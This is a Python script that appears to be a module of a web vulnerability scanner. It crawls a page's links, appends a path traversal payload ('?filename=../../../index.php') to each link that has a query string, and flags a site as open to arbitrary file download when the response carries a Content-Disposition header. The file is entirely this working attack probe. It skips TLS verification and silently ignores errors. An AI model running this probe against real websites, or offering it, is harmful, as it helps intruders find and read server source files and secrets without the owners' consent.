import requests
from lxml import etree
from urllib import request
from bs4 import BeautifulSoup


def mode_down(url):
    down_path = "?filename=../../../index.php"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
        "Accept-Encoding": "gzip, deflate",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",

    }
    res1 = requests.get(url, headers=headers, verify=False, timeout=5)
    h = requests.head(url, allow_redirects=True)
    header = h.headers

    try:
        v = False
        if 'href' in res1.text:
            html = etree.HTML(res1.content)
            last_dir = url.rsplit('/', 1)[0]
            link_text_list = html.xpath('//a/@href')
            for link_text in link_text_list:
                if "?" in link_text:
                    link_text = link_text.rsplit('?', 1)[0]

                    url = last_dir + '/' + link_text + down_path

                    # res2 = requests.get(url, headers=headers, verify=False, timeout=5)
                    h = requests.head(url, allow_redirects=True)
                    header = h.headers
                    if header.get("Content-Disposition"):
                        v = True
                        break
                if v:
                    break
    except:
        pass
    if v:
        return True, url, down_path, 'file_download_yes!'
    else:
            return False, url
